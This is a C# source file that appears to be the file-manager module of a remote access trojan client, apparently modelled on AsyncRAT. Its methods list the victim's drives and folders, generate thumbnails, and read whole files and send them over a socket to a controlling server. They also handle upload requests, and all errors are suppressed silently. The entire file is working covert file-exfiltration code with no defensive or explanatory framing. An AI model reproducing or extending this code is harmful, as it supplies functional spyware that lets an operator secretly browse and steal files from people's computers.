﻿using Client.MessagePack;
using Client.Sockets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace Client.Handle_Packet
{
    public class FileManager
    {
        public void GetDrivers()
        {
            try
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getDrivers";
                StringBuilder sbDriver = new StringBuilder();
                foreach (DriveInfo d in allDrives)
                {
                    if (d.IsReady)
                    {
                        sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                    }
                    msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                    ClientSocket.Send(msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        public void GetPath(string path)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                StringBuilder sbFolder = new StringBuilder();
                StringBuilder sbFile = new StringBuilder();

                foreach (string folder in Directory.GetDirectories(path))
                {
                    sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
                }
                foreach (string file in Directory.GetFiles(path))
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        GetIcon(file).Save(ms, ImageFormat.Png);
                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length.ToString() + "-=>");
                    }
                }
                msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                msgpack.ForcePathObject("File").AsString = sbFile.ToString();
                ClientSocket.Send(msgpack.Encode2Bytes());
            }
            catch { }
        }

        private Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") || file.EndsWith("bmp"))
                {
                    using (Bitmap myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(64, 64, new Image.GetThumbnailImageAbort(() => false), IntPtr.Zero));
                    }
                }
                else
                    using (Icon icon = Icon.ExtractAssociatedIcon(file))
                    {
                        return icon.ToBitmap();
                    }
            }
            catch
            {
                return new Bitmap(64, 64);
            }
        }

        public void DownnloadFile(string file, string dwid)
        {
            try
            {
                TempSocket tempSocket = new TempSocket();

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                msgpack.ForcePathObject("Command").AsString = "pre";
                msgpack.ForcePathObject("DWID").AsString = dwid;
                msgpack.ForcePathObject("File").AsString = file;
                msgpack.ForcePathObject("Size").AsString = new FileInfo(file).Length.ToString();
                tempSocket.Send(msgpack.Encode2Bytes());


                MsgPack msgpack2 = new MsgPack();
                msgpack2.ForcePathObject("Packet").AsString = "socketDownload";
                msgpack2.ForcePathObject("Command").AsString = "save";
                msgpack2.ForcePathObject("DWID").AsString = dwid;
                msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
                msgpack2.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(file));
                tempSocket.Send(msgpack2.Encode2Bytes());
                tempSocket.Dispose();
            }
            catch
            {
                return;
            }
        }

        //private void ChunkSend(byte[] msg, Socket client, SslStream ssl)
        //{
        //    try
        //    {
        //        byte[] buffersize = BitConverter.GetBytes(msg.Length);
        //        client.Poll(-1, SelectMode.SelectWrite);
        //        ssl.Write(buffersize);
        //        ssl.Flush();

        //        int chunkSize = 50 * 1024;
        //        byte[] chunk = new byte[chunkSize];
        //        using (MemoryStream buffereReader = new MemoryStream(msg))
        //        {
        //            BinaryReader binaryReader = new BinaryReader(buffereReader);
        //            int bytesToRead = (int)buffereReader.Length;
        //            do
        //            {
        //                chunk = binaryReader.ReadBytes(chunkSize);
        //                bytesToRead -= chunkSize;
        //                ssl.Write(chunk);
        //                ssl.Flush();
        //            } while (bytesToRead > 0);

        //            binaryReader.Dispose();
        //        }
        //    }
        //    catch { return; }
        //}

        public void ReqUpload(string id)
        {
            try
            {
                TempSocket tempSocket = new TempSocket();
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                msgpack.ForcePathObject("ID").AsString = id;
                tempSocket.Send(msgpack.Encode2Bytes());
            }
            catch { return; }
        }
    }
}
